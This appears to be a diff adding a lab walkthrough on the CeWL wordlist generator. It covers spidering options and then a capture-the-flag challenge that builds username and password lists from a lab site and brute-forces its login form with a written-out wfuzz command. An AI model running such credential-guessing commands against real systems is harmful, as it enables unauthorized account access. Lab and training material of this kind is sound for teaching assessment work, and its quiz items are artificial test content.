@@ -1,0 +1,163 @@
+# CeWL
+
+## Overview
+
+CeWL, pronounced "cool," is a custom wordlist generator used during web application assessment and penetration testing.
+
+- CeWL spiders a target website and builds wordlists from the visible site content.
+- Spidering means automatically navigating and cataloging website content, including linked pages, site structure, and text that may reveal target-specific terminology.
+- CeWL is useful when generic password lists are too broad because it produces words that reflect the target organization, product names, staff names, project names, and other contextual terms.
+- Generated words can support brute-force testing, login auditing, hidden directory discovery, and target-specific fuzzing.
+- CeWL can also collect email addresses and potential usernames from page content and team-member links.
+
+## How to Use CeWL
+
+Display CeWL help and available options:
+
+```bash
+cewl -h
+```
+
+![How to Use CeWL](/images/cewl-101.png)
+
+Install CeWL when it is not already present:
+
+```bash
+sudo apt-get install cewl -y
+```
+
+Generate a basic wordlist from a website:
+
+```bash
+cewl http://website -w output.txt
+```
+
+## Why CeWL?
+
+CeWL is useful because it generates smaller, more relevant wordlists than generic dictionaries.
+
+### Target-Specific Wordlists
+
+- Builds wordlists from the target website itself.
+- Captures vocabulary and terminology used by the organization.
+- Increases the efficiency of brute-force and discovery tasks by reducing irrelevant guesses.
+
+### Depth of Search
+
+- Can spider a site to a specified depth.
+- Can extract words from the original page and linked pages.
+- Helps gather vocabulary that may not appear on the landing page.
+
+### Customizable Output
+
+- Supports minimum and maximum word lengths.
+- Can remove or include numbers depending on the use case.
+- Can include metadata-derived words.
+- Can tailor output for password attacks, username discovery, directory brute forcing, or file discovery.
+
+### Built-In Enumeration Features
+
+- Can extract usernames from author metadata.
+- Can extract email addresses.
+- Can support later authentication testing by generating target-specific username and password candidates.
+
+### Efficiency and Tool Integration
+
+- Produces concise lists that are faster to test than large generic lists.
+- Integrates into automated workflows.
+- Output can be fed directly into tools such as `wfuzz`, `ffuf`, Hydra, or other assessment utilities.
+- CeWL is actively maintained, helping it remain compatible with current testing workflows.
+
+## How to Customize Output for Specific Tasks
+
+### Specify Spidering Depth
+
+Use `-d` to control how many linked levels CeWL spiders.
+
+```bash
+cewl http://10.10.250.208 -d 2 -w output1.txt
+```
+
+### Set Minimum and Maximum Word Length
+
+Use `-m` for minimum word length and `-x` for maximum word length.
+
+```bash
+cewl http://10.10.250.208 -m 5 -x 10 -w output2.txt
+```
+
+### Handle Authentication
+
+Use `-a` when the target site requires form-based authentication.
+
+### Add Numbers or Extensions
+
+- `--with-numbers` appends numbers to words.
+- `--extension` appends custom extensions to each word, which can support directory or file brute forcing.
+
+### Follow External Links
+
+By default, CeWL does not spider external sites. Use `--offsite` to allow external link spidering when that behavior is authorized and in scope.
+
+## Practical Challenge
+
+The target login portal is:
+
+```text
+http://10.10.250.208/login.php
+```
+
+The operational objective is to generate target-specific username and password candidates, then test them against the login form.
+
+### Step 1: Create a Password List with CeWL
+
+Generate a password list by spidering two levels deep, keeping words with at least five characters, and including number variants:
+
+```bash
+cewl -d 2 -m 5 -w passwords.txt http://10.10.250.208 --with-numbers
+```
+
+![Practical Challenge](/images/cewl-102.png)
+
+Operational note: watch for AntarctiCrafts-specific terminology or phrases that are likely to matter to staff. Those terms are more useful than generic password guesses because they reflect the organization’s own language.
+
+### Step 2: Create a Username List with CeWL
+
+Generate a lowercase username list from the team page:
+
+```bash
+cewl -d 0 -m 5 -w usernames.txt http://10.10.250.208/team.php --lowercase
+```
+
+![Practical Challenge](/images/cewl-103.png)
+
+### Step 3: Brute-Force the Login Portal with Wfuzz
+
+Wfuzz is a web application brute-force and fuzzing tool. It can test directories, scripts, GET and POST parameters, and form fields.
+
+Use the generated username and password lists against `/login.php`:
+
+```bash
+wfuzz -c   -z file,usernames.txt   -z file,passwords.txt   --hs "Please enter the correct credentials"   -u http://10.10.250.208/login.php   -d "username=FUZZ&password=FUZ2Z"
+```
+
+![Practical Challenge](/images/cewl-104.png)
+
+Command meaning:
+
+- `-z file,usernames.txt` loads the username list.
+- `-z file,passwords.txt` loads the password list generated by CeWL.
+- `--hs "Please enter the correct credentials"` hides responses containing the known failed-login message.
+- `-u` specifies the target URL.
+- `-d "username=FUZZ&password=FUZ2Z"` defines the POST body. `FUZZ` is replaced by usernames, and `FUZ2Z` is replaced by passwords.
+
+### Step 4: Log In with the Discovered Credentials
+
+After Wfuzz identifies a valid username and password combination, use those credentials to log in to the application.
+
+![Practical Challenge](/images/cewl-105.png)
+
+## Answer the Questions Below
+
+- What is the correct username and password combination? Format: `username:password`
+- What is the flag?
